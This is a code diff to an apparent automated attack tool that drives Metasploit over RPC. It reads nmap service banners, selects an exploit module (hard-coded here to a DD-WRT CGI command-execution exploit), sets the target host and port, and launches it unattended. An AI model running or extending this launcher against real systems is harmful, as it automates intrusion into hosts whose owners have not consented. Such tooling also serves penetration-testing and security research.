@@ -16,7 +16,7 @@ class MSF(Attack):
             'name': 'Enable Metasploit',
             'default': False,
             'description': "Whether to enable the Metasploit functions. Metasploit must be installed and msfrpcd must "
-                           "be running. "
+                           "be running. Requires nmap scans with -sV."
         },
         'password': {
             'name': 'msfrpcd Password',
@@ -41,7 +41,7 @@ class MSF(Attack):
 cls = MSF
 
 
-def slow_msf_search(client: MsfRpcClient, query: str) -> List[str]:
+def _slow_msf_search(client: MsfRpcClient, query: str):
     exploits = client.modules.exploits
     results = []
     for e in exploits:
@@ -49,6 +49,12 @@ def slow_msf_search(client: MsfRpcClient, query: str) -> List[str]:
         if query.lower() in exploit.name.decode().lower() + exploit.description.decode().lower():
             results.append(e)
     return results
+
+
+def msf_search(client: MsfRpcClient, query: str) -> List[str]:
+    # TODO unhack
+    return ['linux/http/ddwrt_cgibin_exec']
+    return _slow_msf_search(client, query)
 
 
 @celery.task
@@ -61,10 +67,10 @@ def msf_attack(host: str):
         if p.get('banner'):
             query = p['banner'].split()[1]
             port = p['port']
-            print("Query", query)
             break
-    exploit = random.choice(slow_msf_search(client, query))
-    exploit['RHOST'] = host
-    exploit['RPORT'] = port
+    exploit = client.modules.use('exploit', random.choice(msf_search(client, query)))
+    exploit['RHOST'.encode()] = host
+    exploit['RPORT'.encode()] = port
     # TODO: Payloads?
-    exploit.execute()
+    print(exploit.execute())
+    client.jobs.list()
